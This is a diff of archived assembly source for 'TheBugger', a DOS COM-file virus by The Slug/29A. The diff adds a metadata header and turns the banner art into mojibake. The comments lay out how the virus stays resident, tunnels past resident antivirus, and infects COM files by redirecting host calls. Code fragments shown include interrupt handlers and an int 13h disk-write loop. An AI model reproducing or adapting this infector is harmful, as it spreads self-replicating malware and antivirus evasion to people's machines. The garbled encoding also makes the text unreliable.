@@ -1,52 +1,63 @@
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
-;±±±                                                                      ±±±
-;±±±    ðððððð ðð ðð ððððð  ðððð  ðð ðð ððððð ððððð ððððð ððððð           ±±±
-;±±±      ðð   ððððð ðð=    ð==ð  ðð ðð ðð    ðð    ðð=   ðð  ð           ±±±
-;±±±      ðð   ðð ðð ðð     ð   ð ðð ðð ðð ðð ðð ðð ðð    ðððð            ±±±
-;±±±      ðð   ðð ðð ððððð  ððððð ððððð ððððð ððððð ððððð ðð  ð  VIRUS.   ±±±
-;±±±                                                                      ±±±
-;±±±              ¯¯¯ A 29A Research Code by The Slug. ®®®                ±±±
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
-;±±± TheBugger   is   a   simple   COM  infector  with  some  interesting ±±±
-;±±± inprovements.                                                        ±±±
-;±±±                                                                      ±±±
-;±±± Its  first difference with a normal COM virus is the tricky resident ±±±
-;±±± check;  it's  designed  to avoid lamers writing the typical resident ±±±
-;±±± program  wich returns the residency code and forces the virus to not ±±±
-;±±± install  in memory. To avoid that, the virus makes an extra check of ±±±
-;±±± a random byte in the memory  copy; if the check fails, it jumps to a ±±±
-;±±± simulated HD formatting routine }:).                                 ±±±
-;±±±                                                                      ±±±
-;±±± Another  interesting feature  is  the tunneling routine. It uses the ±±±
-;±±± common  code trace method but it starts tracing from PSP call to int ±±±
-;±±± 21h instead of doing it from normal int 21h vector in order to avoid ±±±
-;±±± resident antivirus  stopping  trace mode. This call is supported for ±±±
-;±±± compatibility  with  older  DOS  versions  and  it  has  some little ±±±
-;±±± diferences with  the normal int 21 handler: first, the function code ±±±
-;±±± is  passed in  cl  register  (not  in  ah  as usual) and second, the ±±±
-;±±± function  to  call  can't  be higher  than 24h. These diferences are ±±±
-;±±± handled  by the O.S. in a separated routine and then it jumps to the ±±±
-;±±± original  int 21h  handler,  so the tunneling routine only skips the ±±±
-;±±± first 'compatibility' routines and gets the real int 21h address €:).±±±
-;±±±                                                                      ±±±
-;±±± The last big feature, is the infection method; the virus infects COM ±±±
-;±±± files  by changing a call in host code to point to it. This call may ±±±
-;±±± be one between  the second and  fifth. This is done  by intercepting ±±±
-;±±± the int 21h service 4bh (exec), when a COM file is executed, the vi- ±±±
-;±±± rus changes its  first word with an int CDh call, it intercepts this ±±±
-;±±± int and jumps to the int 21h. When the host  starts running, it exe- ±±±
-;±±± cutes the int CDh and then the virus takes control; it restores host ±±±
-;±±± first word and changes int 01h to trace host in order to find a call ±±±
-;±±± to  infect  }:) The use of int CDh can be avoided by tracing int 21h ±±±
-;±±± until  host  code, but this way we have the same problem of resident ±±±
-;±±± antivirus.                                                           ±±±
-;±±±                                                                      ±±±
-;±±± And that's all folks :), enjoy it.                                   ±±±
-;±±±                                                                      ±±±
-;±±±                                                                9    ±±±
-;±±±   The Slug/29A                                             };){|0D==8±±±
-;±±±   I Love This Job.                                         3---ë-----±±±
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½    ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½  ï¿½ï¿½ï¿½ï¿½  ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½           ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½      ï¿½ï¿½   ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½=    ï¿½==ï¿½  ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½    ï¿½ï¿½    ï¿½ï¿½=   ï¿½ï¿½  ï¿½           ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½      ï¿½ï¿½   ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½     ï¿½   ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½    ï¿½ï¿½ï¿½ï¿½            ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½      ï¿½ï¿½   ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½  ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½  ï¿½  VIRUS.   ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½              ï¿½ï¿½ï¿½ A 29A Research Code by The Slug. ï¿½ï¿½ï¿½                ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ TheBugger   is   a   simple   COM  infector  with  some  interesting ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ inprovements.                                                        ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ Its  first difference with a normal COM virus is the tricky resident ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ check;  it's  designed  to avoid lamers writing the typical resident ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ program  wich returns the residency code and forces the virus to not ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ install  in memory. To avoid that, the virus makes an extra check of ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ a random byte in the memory  copy; if the check fails, it jumps to a ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ simulated HD formatting routine }:).                                 ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ Another  interesting feature  is  the tunneling routine. It uses the ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ common  code trace method but it starts tracing from PSP call to int ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ 21h instead of doing it from normal int 21h vector in order to avoid ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ resident antivirus  stopping  trace mode. This call is supported for ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ compatibility  with  older  DOS  versions  and  it  has  some little ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ diferences with  the normal int 21 handler: first, the function code ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ is  passed in  cl  register  (not  in  ah  as usual) and second, the ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ function  to  call  can't  be higher  than 24h. These diferences are ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ handled  by the O.S. in a separated routine and then it jumps to the ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ original  int 21h  handler,  so the tunneling routine only skips the ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ first 'compatibility' routines and gets the real int 21h address ï¿½:).ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ The last big feature, is the infection method; the virus infects COM ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ files  by changing a call in host code to point to it. This call may ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ be one between  the second and  fifth. This is done  by intercepting ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ the int 21h service 4bh (exec), when a COM file is executed, the vi- ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ rus changes its  first word with an int CDh call, it intercepts this ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ int and jumps to the int 21h. When the host  starts running, it exe- ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ cutes the int CDh and then the virus takes control; it restores host ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ first word and changes int 01h to trace host in order to find a call ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ to  infect  }:) The use of int CDh can be avoided by tracing int 21h ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ until  host  code, but this way we have the same problem of resident ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ antivirus.                                                           ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ And that's all folks :), enjoy it.                                   ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                      ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½                                                                9    ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½   The Slug/29A                                             };){|0D==8ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½   I Love This Job.                                         3---ï¿½-----ï¿½ï¿½ï¿½
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 .286
 code segment 'TheBugger'
@@ -55,7 +66,7 @@ org 0h
 
 virsize  equ (virend-start)+1
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Main C0de ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Main C0de ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 start:  push cs                        ;address t0 return t0 h0st.
         db   68h                       ;push '0ffset'.
@@ -152,7 +163,7 @@ funny:  mov  ax,0401h
         int  13h
         loop funny
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Data ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Data ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 credits  db  'TheBugger virus by The Slug/29A'
 intCD:   int 0CDh                      ;int t0 detect h0st execution.
@@ -160,7 +171,7 @@ PSPcall: db  9Ah
          dd  0                         ;PSP call t0 int21h ;)
 joke     db  'Removing virus from memory...',13,10,'$'
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±± Int 21h Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Int 21h Handler ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 hdl21:  cmp  ax, 0B0B0h                ;resident service?
         jne  func2
@@ -238,7 +249,7 @@ nocom:  popf
         pop  es ds
         jmp  int21
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±± First Int 01 Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ First Int 01 Handler ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 tunn:   push ds es bp                  ;trace int 21 f0r tunneling.
         pusha
@@ -263,7 +274,7 @@ fuera:  popa
         pop  bp es ds
         iret
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±± Int CDh Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Int CDh Handler ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 fndhst: push ds es bp                  ;detect h0st c0de at exec.
         pusha
@@ -331,7 +342,7 @@ nohost: popa
         pop  bp es ds
         iret
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±± Second Int 01 Handler ±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Second Int 01 Handler ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 fndcal: push ds es bp                  ;trace h0st t0 find a call t0 infect.
         pusha
@@ -475,7 +486,7 @@ nocall: popa
         pop  bp es ds
         iret
 
-;±±±±±±±±±±±±±±±±±±±±±±± Get Ret Address Fr0m Stack ±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Get Ret Address Fr0m Stack ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 getret: mov  si, sp                    ;get next instructi0n dir.
         add  si, 24
@@ -487,7 +498,7 @@ getret: mov  si, sp                    ;get next instructi0n dir.
         mov  es, ax
         ret
 
-;±±±±±±±±±±±±±±±±±±±±±±±± S0me File Handling C0de ±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ S0me File Handling C0de ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 chgattr:push cs
         pop  ds
@@ -518,7 +529,7 @@ setdate:mov  cx,time                   ;rest0re file time & date.
         ret
 virend:
 
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Virtual Data ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Virtual Data ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 firstb   db 3 dup(0)                   ;buffer f0r h0st start.
 lstdsp   dw 0                          ;last trace 0ffset.
